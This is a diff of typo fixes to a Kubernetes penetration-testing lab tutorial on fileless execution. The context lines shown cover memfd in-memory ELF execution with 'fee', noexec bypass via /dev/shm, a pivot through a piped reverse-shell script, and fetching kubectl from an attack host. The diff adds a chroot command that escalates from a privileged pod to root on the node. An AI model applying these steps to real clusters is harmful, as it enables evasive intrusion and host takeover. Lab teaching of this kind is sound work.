@@ -28,7 +28,7 @@ In this tutorial, we'll explore the concept of fileless execution within Kuberne
 
 ## Lab Setup:
 <a id="item-zero"></a>
-Docker and Minikube are used as the infrastructe to make the lab as portable as possible.
+Docker and Minikube are used as the infrastructure to make the lab as portable as possible.
 ![N|Solid](./images/lab.png)
 ```sh
 cd k8syamls/
@@ -64,7 +64,7 @@ curl -i -s -k -X $'POST' \
 ```
 ## Step 2: Enumerating our envioment 
 
-By checking the envoroment variables we can deduce that we are in a Kubernetes enviorment. 
+By checking the environment variables we can deduce that we are in a Kubernetes environment. 
 ```bash
 $ env
 KUBERNETES_PORT_443_TCP_PROTO=tcp
@@ -84,14 +84,14 @@ Observations:
 
 ## Step 3: Dealing with Read-Only File System
 
-(https://breakdance.github.io/breakdance/) shows how we can we can utilize tmpfs mounted filesystems for temporary file manipulation. We will be using the memfd syscall to create in memory elf64 binary files. Then execute those files without touching the file system. As we are not leaving any traces or files (IoC) on the file system. We will try to confine our actives in memory when posible.
+(https://breakdance.github.io/breakdance/) shows how we can we can utilize tmpfs mounted filesystems for temporary file manipulation. We will be using the memfd syscall to create in memory elf64 binary files. Then execute those files without touching the file system. As we are not leaving any traces or files (IoC) on the file system. We will try to confine our actives in memory when possible.
 
 Check what filesystems are mounted with tmpfs as paths may vary.
 ```sh
 $ mount -t tmpfs
 shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
 ```
-We can interact with `/dev/shm` for our purposes to execute scripts with python inpreter in runnimg memroy, even bypassing `noexec` flags assosated with the filesystem.
+We can interact with `/dev/shm` for our purposes to execute scripts with python interpreter in running memory, even bypassing `noexec` flags associated with the filesystem.
 
 `/dev/shm` will gernally be available for all pods on a Kuberntes work node by `default`.
 
@@ -102,7 +102,7 @@ We can see what version of python is available on the system with `python --vers
 # Introduction to Fee: https://pypi.org/project/fee/ 
 Execute ELF files on a machine without dropping an ELF.
 
-Create a Docker image to convert our elf64 binaries into inerperated code 
+Create a Docker image to convert our elf64 binaries into interperted code 
 `Docker Image`:
 ```sh
 FROM python:3
@@ -111,7 +111,7 @@ RUN pip install --user fee
 ```
 ---
 
-Test fee by copying the `id` biniary onto your local and converting it to python with `fee`
+Test fee by copying the `id` binary onto your local and converting it to python with `fee`
 ```sh
 $ cp backend/postgres-deployment-85696c855-mr4c2:/usr/bin/id /tmp/kid
 $ file /tmp/kid
@@ -157,13 +157,13 @@ docker run -v /tmp/:/host -it localhost:5000/docker-fee:0.1 /bin/sh -c '/root/.l
 ```bash
 cat psqlrev.py | kubectl -n frontend exec -it app-6f85bcbff4-m6zht -- python3
 ```
-You should now be on the backend server
+You should now be on the backend server!
 
 ----
 ## Step 6 
 <a id="item-six"></a>
 Now that we have laterally pivited to backend server that does not have a read-only mount we are going to pull `kubectl` command 
-with perl from or attack host or from the interweb. We are using perl as our interperter as python3 is not installed on postgres container. With diverse workloads we need many different tools.
+with perl from or attack host or from the interweb. We are using perl as our interpreter as python3 is not installed on postgres container. With diverse workloads we need many different tools.
 
 ```perl
 #!/usr/bin/perl use strict;
@@ -223,8 +223,9 @@ kubectl run everything-allowed-exec-pod --image=ubuntu --overrides='
 }' --labels=app=pentest --restart=Never
 ```
 
-## Now exec it and chroot the host mount at /host to elevate to root on the Worker node!
+## Now exec it and chroot the host mount at /host to elevate to root on the worker node!
 ```sh
+kubectl exec -it <badpod> -- /bin/sh -c 'chroot /host'
 ```
 # Tools
 
@@ -335,13 +336,10 @@ if ($response->{success}) {
 ```
 ## Conclusion
 
-Through these steps, we've demonstrated fileless execution within a Kubernetes environment, highlighting techniques to navigate around read-only file systems and interact with network services.
+We've demonstrated fileless execution within a Kubernetes environment, highlighting techniques to navigate around read-only file systems and interact with network services.
 
 
 ## References 
-
-Dillinger is currently extended with the following plugins.
-Instructions on how to use them in your own application are linked below.
 
 | Tech | Link |
 | ------ | ------ |
